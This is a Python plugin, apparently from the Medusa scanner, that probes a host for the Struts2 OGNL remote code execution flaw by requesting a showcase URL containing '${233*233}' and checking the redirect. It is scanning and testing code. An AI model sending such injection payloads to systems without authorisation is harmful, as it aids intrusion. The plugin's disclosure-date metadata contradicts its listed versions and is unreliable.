#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2010-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability57"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞57' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "0"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload='''/struts2-showcase/$%7B233*233%7D/actionChain1.action'''


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+payload
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': RandomAgent,
        'Connection': 'close',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }

    try:
        resp = requests.get(payload_url,headers=headers, proxies=proxies,timeout=5,allow_redirects=False)
        con = resp.headers['Location']
        code = resp.status_code
        if code==302 and con.lower().find('54289')!=-1:
            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:版本低于<=Struts2_3_34,Struts2_5_16\r\nPayload:{}\r\n".format(url, payload_url)
            _t = VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类